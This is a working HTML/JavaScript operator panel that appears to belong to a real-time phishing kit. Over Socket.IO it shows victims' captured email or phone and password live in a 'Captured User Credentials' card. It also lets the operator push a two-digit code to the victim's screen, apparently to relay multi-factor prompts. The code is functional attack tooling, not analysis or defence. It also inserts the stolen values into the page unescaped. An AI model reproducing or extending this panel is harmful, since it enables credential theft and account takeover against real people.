<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Dashboard</title>
<!-- Load Socket.IO client library -->
<script src="/socket.io/socket.io.js"></script>
<style>
  body { background: #1a1c1e; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; gap: 20px; }
  .card { background: #202429; padding: 25px; border-radius: 12px; text-align: center; width: 360px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
  input { background: #121212; border: 2px solid #8ab4f8; color: white; padding: 12px; font-size: 20px; border-radius: 6px; width: 100%; box-sizing: border-box; text-align: center; margin: 15px 0; outline: none; }
  button { background: #8ab4f8; color: #000; padding: 12px; border: none; border-radius: 24px; cursor: pointer; font-weight: bold; width: 100%; font-size: 15px; }
  .log-box { background: #121212; border: 1px solid #3c4043; border-radius: 8px; padding: 15px; text-align: left; font-size: 14px; color: #e3e2e6; word-break: break-all; margin-top: 10px; }
  .log-label { color: #8ab4f8; font-weight: bold; display: block; margin-bottom: 2px; }
  .log-value { color: #81c995; font-family: monospace; font-size: 15px; }
</style>
</head>
<body>

  <!-- ADMIN SENDER -->
  <div class="card">
    <h2>Admin Sender</h2>
    <p style="font-size: 13px; color: #9aa0a6;">Type a 2-digit number to push to user screen</p>
    <input type="number" id="adminInput" placeholder="00">
    <button onclick="pushNumber()">Send to User</button>
  </div>

  <!-- CAPTURED USER CREDENTIALS -->
  <div class="card">
    <h3>Captured User Inputs</h3>
    <div class="log-box" id="userLog">
      <span style="color: #9aa0a6;">Waiting for user to submit credentials...</span>
    </div>
  </div>

  <script>
    const socket = io();

    function pushNumber() {
      const code = document.getElementById('adminInput').value;
      if (!code) return;
      socket.emit('admin_send_code', { code: code });
      document.getElementById('adminInput').value = '';
    }

    // Display incoming email and password live on admin screen
    socket.on('admin_receive_credentials', (data) => {
      document.getElementById('userLog').innerHTML = `
        <div style="margin-bottom: 12px;">
          <span class="log-label">Email / Phone:</span>
          <span class="log-value">${data.email}</span>
        </div>
        <div>
          <span class="log-label">Password:</span>
          <span class="log-value">${data.password}</span>
        </div>
      `;
    });
  </script>
</body>
</html>
